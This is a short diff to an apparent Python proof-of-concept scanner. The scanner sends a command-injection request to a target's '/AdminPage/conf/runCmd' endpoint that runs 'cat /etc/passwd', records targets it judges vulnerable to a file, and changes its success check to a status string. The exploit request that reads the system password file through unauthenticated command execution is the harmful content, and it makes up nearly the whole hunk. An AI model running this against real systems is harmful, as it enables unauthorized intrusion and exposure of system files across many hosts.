@@ -23,7 +23,7 @@ def poc(target):
     url = target+"/AdminPage/conf/runCmd?cmd=cat+/etc/passwd%26%26echo%20nginx"
     try:
         res = requests.get(url,headers=headers,timeout=5,verify=False).text
-        if 'root' in res:
+        if '"status":"200"' in res:
             print(f"[+] {target} is vulable")
             with open("request.txt","a+",encoding="utf-8") as f:
                 f.write(target+"\n")
